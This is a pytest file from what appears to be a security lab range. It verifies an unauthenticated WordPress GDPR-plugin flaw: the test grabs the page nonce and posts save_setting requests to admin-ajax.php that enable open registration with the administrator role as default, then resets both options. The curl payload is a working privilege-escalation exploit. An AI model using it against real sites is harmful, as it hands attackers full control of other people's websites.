import re

from conftest import TARGET_PUBLIC
from range import ATTACKER, run

CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')


def _option(name):
    return run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT option_value FROM wp_options WHERE option_name='{name}';",
    ]).stdout.strip()


def _set_option(name, value):
    run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
        f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';",
    ])


def _ajax_nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}/",
    ]).stdout
    found = NONCE.search(page)
    assert found, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
    return found.group(1)


def _flip(security, option, value):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", f'data={{"type":"save_setting","append":false,"option":"{option}","value":"{value}"}}',
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={security}",
    ]).stdout.strip()


def test_the_unauthenticated_option_flip_lets_anyone_self_register_as_administrator(stack_is_up):
    try:
        nonce = _ajax_nonce()

        code = _flip(nonce, "users_can_register", "1")
        assert code == "200", f"the users_can_register flip did not complete, got {code!r}"
        assert _option("users_can_register") == "1"

        code = _flip(nonce, "default_role", "administrator")
        assert code == "200", f"the default_role flip did not complete, got {code!r}"
        assert _option("default_role") == "administrator"
    finally:
        _set_option("users_can_register", "0")
        _set_option("default_role", "subscriber")
        assert _option("users_can_register") == "0"
        assert _option("default_role") == "subscriber"
